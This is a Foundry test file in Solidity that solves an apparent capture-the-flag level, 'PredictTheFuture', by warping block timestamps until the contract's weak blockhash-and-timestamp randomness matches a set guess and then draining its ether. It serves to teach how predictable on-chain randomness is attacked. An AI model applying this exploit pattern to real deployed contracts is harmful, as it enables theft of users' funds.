// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/06_PredictTheFuture/PredictTheFuture.sol";

// forge test --match-contract PredictTheFutureTest -vvvv
contract PredictTheFutureTest is BaseTest {
    PredictTheFuture instance;

    function setUp() public override {
        super.setUp();
        instance = new PredictTheFuture{value: 0.01 ether}();

        vm.roll(143242);
        vm.warp(1000000);
    }

    function testExploitLevel() public {
        uint8 myGuess = 0;

        vm.deal(address(this), 0.02 ether);
        uint256 currentBlockNumber = block.number;
        instance.setGuess{value: 0.01 ether}(myGuess);
        uint256 nextBlockNumber = currentBlockNumber + 1;

        vm.roll(nextBlockNumber + 1);
        require(block.number > nextBlockNumber, "Block number not advanced");
        bytes32 prevBlockHash = blockhash(block.number - 1);
        uint256 currentTimestamp = block.timestamp;

        bool found = false;

        for (uint256 i = 0; i < 1000; i++) {
            uint256 testTimestamp = currentTimestamp + i;
            vm.warp(testTimestamp);
            uint256 answer = uint256(keccak256(abi.encodePacked(prevBlockHash, testTimestamp))) % 10;

            if (answer == myGuess) {
                found = true;
                break;
            }
        }
        require(found, "Could not find matching timestamp");
        instance.solution();

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
